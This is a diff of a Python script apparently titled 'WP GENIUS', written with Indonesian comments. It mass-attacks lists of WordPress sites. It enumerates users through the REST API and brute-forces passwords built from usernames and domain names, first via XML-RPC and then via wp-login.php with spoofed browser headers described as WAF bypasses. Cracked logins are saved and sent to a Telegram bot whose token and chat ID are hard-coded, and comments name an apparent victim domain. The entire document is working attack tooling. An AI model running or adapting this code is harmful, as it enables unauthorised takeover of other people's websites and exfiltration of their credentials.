@@ -3,10 +3,8 @@ import concurrent.futures
 import urllib3
 import sys
 import random
-import time
-import re
 from datetime import datetime
-from requests.exceptions import ConnectTimeout, ReadTimeout, ConnectionError
+from requests.adapters import HTTPAdapter
 
 # Matikan warning SSL
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -15,9 +13,8 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 INPUT_FILE = 'list_domain.txt'
 OUTPUT_FILE = 'pwned_results.txt'
 THREADS = 50           
-TIMEOUT = 15           
-BATCH_SIZE = 40        
-MAX_RETRIES = 2        
+TIMEOUT = (6, 12)      # (Connect, Read) - Mencegah stuck
+MAX_PASSWORDS = 50     
 
 # --- KONFIGURASI TELEGRAM ---
 TELEGRAM_TOKEN = "7994121895:AAEAr83U4UreqI7f0qsyFPzBUOkYOFaCvVY"
@@ -25,7 +22,6 @@ TELEGRAM_CHAT_ID = "6602672328"
 
 IGNORED_SUBDOMAINS = ['cpanel', 'webmail', 'whm', 'webdisk', 'autodiscover', 'cpcalendars']
 
-# --- WARNA TERMINAL ---
 class Col:
     GREEN = '\033[92m'
     RED = '\033[91m'
@@ -33,229 +29,219 @@ class Col:
     CYAN = '\033[96m'
     GREY = '\033[90m'
     RESET = '\033[0m'
-    MAGENTA = '\033[95m'
     BLUE = '\033[94m'
 
-# --- FUNGSI NOTIFIKASI ---
-def send_telegram_alert(domain, user, password_info):
+def send_telegram_alert(domain, user, password_info, method):
     if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID: return
-    
-    msg = (f"櫨 *WP CRACKED (Single Call)* 櫨\n\n"
-           f"識 *Target:* `{domain}`\n"
-           f"側 *User:* `{user}`\n"
-           f"泊 *Pass:* `{password_info}`")
     try:
+        msg = (f"🔥 *WP CRACKED ({method})* 🔥\nTarget: `{domain}`\nUser: `{user}`\nPass: `{password_info}`")
         url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
         data = {"chat_id": TELEGRAM_CHAT_ID, "text": msg, "parse_mode": "Markdown"}
-        requests.post(url, data=data, timeout=5)
+        requests.post(url, data=data, timeout=8)
     except: pass
 
 def log(msg, status="INFO"):
     now = datetime.now().strftime("%H:%M:%S")
     colors = {
-        "SUCCESS": Col.GREEN, "FAIL": Col.RED, "WARN": Col.YELLOW, 
-        "SKIP": Col.GREY, "INFO": Col.CYAN, "FOUND": Col.BLUE,
-        "DEBUG": Col.MAGENTA
+        "SUCCESS": Col.GREEN, "INFO": Col.CYAN, "FOUND": Col.BLUE,
+        "SKIP": Col.GREY, "FAIL": Col.RED, "LOGIN": Col.YELLOW
     }
-    print(f"{colors.get(status, Col.RESET)}[{status}] [{now}] {msg}{Col.RESET}", flush=True)
+    print(f"{colors.get(status, Col.RESET)}[{status}] [{now}] {msg}{Col.RESET}")
 
-# --- ROTASI HEADER ---
-USER_AGENTS = [
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15',
-    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
-]
-
-def get_headers(target_url):
-    return {
-        'User-Agent': random.choice(USER_AGENTS),
-        'Content-Type': 'text/xml',
-        'Accept': '*/*',
-        'Connection': 'close',
-        'Referer': target_url
-    }
-
-# --- LOGIKA PASSWORD ---
-def generate_genius_passwords(user_data, target_url):
-    clean_url = target_url.replace("http://", "").replace("https://", "").rstrip("/")
-    domain_only = clean_url.split('/')[0]
-    domain_parts = domain_only.split('.')
-    domain_name = domain_parts[0] if len(domain_parts) > 0 else domain_only
-
-    slug = user_data.get('slug', '').lower()
-    real_name = user_data.get('name', '').lower()
+def get_passwords(user, domain_raw):
+    clean = domain_raw.replace("http://", "").replace("https://", "").strip("/")
+    domain_full = clean.split('/')[0]      # maytinhthienlinh.com
+    domain_name = domain_full.split('.')[0] # maytinhthienlinh
+    slug = user.lower()
     
-    bases = set([slug, slug.capitalize(), domain_name, domain_name.capitalize()])
-    if real_name and real_name != slug:
-        parts = real_name.split()
-        for p in parts:
-            if len(p) > 2:
-                bases.add(p)
-                bases.add(p.capitalize())
-        bases.add(real_name.replace(" ", ""))
-
-    current_year = datetime.now().year
-    years = [str(current_year), str(current_year-1), str(current_year-2)]
-    separators = ["", "@", "#", "!", "_", "-"]
-    suffixes = ["1", "12", "123", "1234", "12345"] + years
-
-    passwords = []
-    for base in bases:
-        passwords.append(base)
-        for sep in separators:
-            for suf in suffixes:
-                passwords.append(f"{base}{sep}{suf}")
-
-    static_passwords = [
-        "password", "123456", "12345678", "qwerty", "1234567890", 
-        "admin123", "admin@123", "password123", "pass123", "admin",
-        "welcome", "login", "master", "server", "webmaster"
+    prio = [
+        slug, f"{slug}123", f"{slug}@123", "admin", "admin123", "pass", "password",
+        "123456", "12345678", 
+        domain_name, f"{domain_name}123", f"{domain_name}12345",
+        domain_full  # <--- Password yang Anda maksud ada di sini
     ]
-    passwords.extend(static_passwords)
-    passwords.append(domain_only) 
-    return list(set(passwords))
+    return list(dict.fromkeys(prio))
 
-def scan_wp_json_users(session, base_url):
-    paths = [
-        "/wp-json/wp/v2/users",
-        "/wp/wp-json/wp/v2/users"
-    ]
+# --- MODUL WP-LOGIN (BROWSER SIMULATION) ---
+def attack_via_wp_login(session, domain_clean, proto, users, base_headers):
+    login_url = f"{proto}{domain_clean}/wp-login.php"
+    admin_url = f"{proto}{domain_clean}/wp-admin/"
     
-    for path in paths:
-        target_json = f"{base_url}{path}"
-        try:
-            r = session.get(target_json, headers={'User-Agent': random.choice(USER_AGENTS)}, timeout=10, verify=False)
-            if r.status_code == 200:
-                try:
-                    data = r.json()
-                    users = []
-                    if isinstance(data, list):
-                        for u in data:
-                            if 'slug' in u:
-                                users.append({'slug': u['slug'], 'name': u.get('name', '')})
-                        root_path = target_json.split("/wp-json")[0]
-                        xmlrpc_url = f"{root_path}/xmlrpc.php"
-                        return True, users, xmlrpc_url
-                except: pass
-            elif r.status_code in [403, 401]:
-                root_path = target_json.split("/wp-json")[0]
-                xmlrpc_url = f"{root_path}/xmlrpc.php"
-                users = [{'slug': 'admin', 'name': ''}, {'slug': 'administrator', 'name': ''}]
-                return True, users, xmlrpc_url
-        except:
-            continue
-    return False, [], None
+    log(f"Simulating Browser -> {domain_clean}", "LOGIN")
 
-def is_valid_domain(line):
-    line = line.strip()
-    if not line: return False
-    if line.startswith("#") or line.startswith("import") or "=" in line or "{" in line: return False
-    if "." not in line: return False 
-    return True
+    # 1. STEP WAJIB: KUNJUNGI HALAMAN DULU (GET) UNTUK DAPAT COOKIE
+    # Banyak WP menolak login jika tidak ada cookie sesi awal
+    try:
+        init_resp = session.get(login_url, headers=base_headers, timeout=TIMEOUT, verify=False)
+        # Update headers dengan Referer (PENTING UNTUK BYPASS SECURITY)
+        post_headers = base_headers.copy()
+        post_headers['Referer'] = login_url
+        post_headers['Origin'] = f"{proto}{domain_clean}"
+        post_headers['Content-Type'] = 'application/x-www-form-urlencoded'
+    except:
+        log(f"Connection Failed -> {domain_clean}", "FAIL")
+        return False
 
+    found = False
+    for user in users:
+        if found: break
+        passwords = get_passwords(user, domain_clean)
+        
+        for pwd in passwords:
+            try:
+                # Payload lengkap seperti browser asli
+                data = {
+                    'log': user,
+                    'pwd': pwd,
+                    'wp-submit': 'Log In',
+                    'redirect_to': admin_url,
+                    'testcookie': '1'
+                }
+                
+                resp = session.post(login_url, data=data, headers=post_headers, timeout=TIMEOUT, verify=False, allow_redirects=False)
+                
+                # Cek Indikator Sukses
+                # 1. Redirect 302
+                # 2. Cookie wordpress_logged_in
+                if resp.status_code == 302 or 'wordpress_logged_in' in str(resp.cookies) or 'wordpress_logged_in' in str(resp.headers):
+                    # Validasi redirect location agar tidak false positive (redirect balik ke login=failed)
+                    loc = resp.headers.get('Location', '')
+                    if "wp-login.php" in loc and "error" in loc:
+                        continue 
+                    
+                    log(f"CRACKED: {login_url} | User: {user} | Pass: {pwd}", "SUCCESS")
+                    with open(OUTPUT_FILE, 'a') as f:
+                        f.write(f"{login_url}|{user}|{pwd}\n")
+                    send_telegram_alert(login_url, user, pwd, "WP-LOGIN")
+                    return True
+                
+                # Debug khusus untuk melihat kenapa gagal (Optional, bisa dihapus)
+                # elif "maytinhthienlinh" in domain_clean and pwd == "maytinhthienlinh.com":
+                #    print(f"[DEBUG] Failed {domain_clean}. Code: {resp.status_code}. Text len: {len(resp.text)}")
+
+            except Exception:
+                continue 
+    
+    return False
+
+# --- ENGINE UTAMA ---
 def attack_domain(domain_raw):
-    if not is_valid_domain(domain_raw): return
-    
+    domain_raw = domain_raw.strip()
+    if not domain_raw or "." not in domain_raw: return
+
     raw_clean = domain_raw.replace('http://', '').replace('https://', '').strip('/')
     for sub in IGNORED_SUBDOMAINS:
         if raw_clean.startswith(f"{sub}."): return
 
-    protocols = ['https://', 'http://']
     session = requests.Session()
+    # Adapter stabil
+    adapter = HTTPAdapter(max_retries=1, pool_connections=THREADS+10, pool_maxsize=THREADS+10)
+    session.mount('http://', adapter)
+    session.mount('https://', adapter)
     
+    # User Agent Chrome Asli
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+        'Accept-Language': 'en-US,en;q=0.5',
+        'Upgrade-Insecure-Requests': '1'
+    }
+
     target_xmlrpc = None
-    target_users = []
-    found_via_json = False
-    
-    for proto in protocols:
-        if found_via_json: break
-        base_url = f"{proto}{raw_clean}"
-        is_found, users, xml_url = scan_wp_json_users(session, base_url)
-        if is_found:
-            found_via_json = True
-            target_xmlrpc = xml_url
-            target_users = users
-            log(f"WP Detected: {base_url} | Users: {len(users)}", "FOUND")
+    target_users = ['admin', 'administrator'] 
+    detected_proto = 'https://'
+    xmlrpc_alive = False
 
-    if not found_via_json:
-        for proto in protocols:
-             if target_xmlrpc: break
-             candidate = f"{proto}{raw_clean}/xmlrpc.php"
-             try:
-                 payload = "<?xml version='1.0'?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"
-                 r = session.post(candidate, data=payload, headers=get_headers(candidate), timeout=8, verify=False)
-                 if r.status_code == 200 or "faultString" in r.text:
-                     target_xmlrpc = candidate
-                     target_users = [{'slug': 'admin', 'name': ''}, {'slug': 'administrator', 'name': ''}]
-                     log(f"WP Detected (Direct): {candidate}", "FOUND")
-             except: pass
-
-    if not target_xmlrpc:
-        log(f"No WP Found -> {raw_clean}", "SKIP")
-        return
-
-    wp_root = target_xmlrpc.replace("/xmlrpc.php", "")
-    
-    # --- MULAI BRUTEFORCE SINGLE CALL ---
-    for user_obj in target_users:
-        user_slug = user_obj['slug']
-        pass_list = generate_genius_passwords(user_obj, wp_root)
-        
-        # Cek maksimal 100 password per user agar tidak terlalu lama
-        for pwd in pass_list[:100]:
-            safe_pass = pwd.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
+    # 1. CEK XMLRPC (PROBE)
+    # Kita coba XMLRPC dulu karena lebih cepat. Kalau gagal baru login manual.
+    for proto in ['https://', 'http://']:
+        url = f"{proto}{raw_clean}/xmlrpc.php"
+        try:
+            probe_payload = (f"<methodCall><methodName>wp.getUsersBlogs</methodName><params>"
+                             f"<param><value><string>admin</string></value></param>"
+                             f"<param><value><string>wrong_pass_test</string></value></param>"
+                             f"</params></methodCall>")
+            # Timeout pendek untuk probe
+            r = session.post(url, data=probe_payload, headers=headers, timeout=(5, 8), verify=False)
             
-            # Payload Single Call (Lebih aman dari block)
-            payload = (
-                f"<?xml version='1.0'?>"
-                f"<methodCall><methodName>wp.getUsersBlogs</methodName>"
-                f"<params>"
-                f"<param><value><string>{user_slug}</string></value></param>"
-                f"<param><value><string>{safe_pass}</string></value></param>"
-                f"</params></methodCall>"
-            )
-            headers = get_headers(target_xmlrpc)
-            
-            try:
-                response = session.post(target_xmlrpc, data=payload, headers=headers, timeout=TIMEOUT, verify=False)
+            if "faultString" in r.text or "isAdmin" in r.text or "blogName" in r.text:
+                target_xmlrpc = url
+                detected_proto = proto
+                xmlrpc_alive = True
                 
-                if response.status_code == 200:
-                    if "isAdmin" in response.text or "blogName" in response.text:
-                        log(f"CRACKED: {target_xmlrpc} | User: {user_slug} | Pass: {pwd}", "SUCCESS")
+                # Ambil User JSON
+                try:
+                    rj = session.get(f"{proto}{raw_clean}/wp-json/wp/v2/users", headers=headers, timeout=(5, 5), verify=False)
+                    if rj.status_code == 200:
+                        json_users = [u['slug'] for u in rj.json() if 'slug' in u]
+                        if json_users: target_users = json_users
+                except: pass
+                break
+        except: continue
+
+    # 2. EKSEKUSI (XMLRPC atau WP-LOGIN)
+    success = False
+    
+    if xmlrpc_alive:
+        log(f"Target (XMLRPC): {raw_clean} | Users: {len(target_users)}", "INFO")
+        for user in target_users:
+            if success: break
+            passwords = get_passwords(user, raw_clean)
+            for pwd in passwords:
+                safe_pass = pwd.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
+                payload = (f"<methodCall><methodName>wp.getUsersBlogs</methodName><params>"
+                           f"<param><value><string>{user}</string></value></param>"
+                           f"<param><value><string>{safe_pass}</string></value></param>"
+                           f"</params></methodCall>")
+                try:
+                    resp = session.post(target_xmlrpc, data=payload, headers=headers, timeout=TIMEOUT, verify=False)
+                    if "isAdmin" in resp.text or "blogName" in resp.text:
+                        log(f"CRACKED: {target_xmlrpc} | User: {user} | Pass: {pwd}", "SUCCESS")
                         with open(OUTPUT_FILE, 'a') as f:
-                            f.write(f"{target_xmlrpc}|{user_slug}|{pwd}\n")
-                        send_telegram_alert(target_xmlrpc, user_slug, pwd)
-                        return # Pindah ke domain berikutnya jika sudah cracked
-                    elif "faultString" in response.text:
-                        # Password salah, lanjut next password
-                        continue
-                    else:
-                        # Status 200 tapi tidak ada isAdmin/blogName/faultString
-                        # Ini biasanya WAF atau response kosong.
-                        pass
-                elif response.status_code in [403, 406, 503]:
-                    # Jika diblokir keras, hentikan untuk user ini
-                    break
-            except:
-                continue
+                            f.write(f"{target_xmlrpc}|{user}|{pwd}\n")
+                        send_telegram_alert(target_xmlrpc, user, pwd, "XMLRPC")
+                        success = True
+                        break
+                    elif resp.status_code in [403, 503]: break
+                except: continue
+    
+    # JIKA XMLRPC GAGAL/MATI -> PINDAH KE WP-LOGIN (HYBRID)
+    if not success:
+        # Re-check user via JSON jika belum dapat
+        if not xmlrpc_alive:
+            try:
+                for proto in ['https://', 'http://']:
+                    rj = session.get(f"{proto}{raw_clean}/wp-json/wp/v2/users", headers=headers, timeout=(5, 5), verify=False)
+                    if rj.status_code == 200:
+                        json_users = [u['slug'] for u in rj.json() if 'slug' in u]
+                        if json_users: 
+                            target_users = json_users
+                            detected_proto = proto
+                            break
+            except: pass
+        
+        # Jalankan serangan Browser Simulation
+        result = attack_via_wp_login(session, raw_clean, detected_proto, target_users, headers)
+        if not result:
+            log(f"Failed -> {raw_clean}", "FAIL")
 
 def main():
-    print(f"{Col.CYAN}--- WP GENIUS (Single Call Mode) ---{Col.RESET}")
-    print(f"Logic: Single Request per Password (Anti-WAF)")
+    print(f"{Col.CYAN}--- WP GENIUS (Browser Simulation) ---{Col.RESET}")
+    print(f"Logic: Cookies + Referer Headers (Bypass WAF/Security)")
     
     try:
-        with open(INPUT_FILE, 'r') as f: 
-            domains = [line.strip() for line in f if is_valid_domain(line)]
-    except: 
-        print(f"File {INPUT_FILE} not found.")
-        return
+        with open(INPUT_FILE, 'r', encoding='utf-8', errors='ignore') as f:
+            domains = list(set([l.strip() for l in f if "." in l]))
+    except: return
 
     random.shuffle(domains)
-    print(f"Valid Targets: {len(domains)}")
+    print(f"Loaded: {len(domains)} targets")
     print("-" * 50)
 
     with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
-        executor.map(attack_domain, domains)
+        futures = [executor.submit(attack_domain, domain) for domain in domains]
+        concurrent.futures.wait(futures)
+
     print("\n[DONE]")
 
 if __name__ == "__main__":
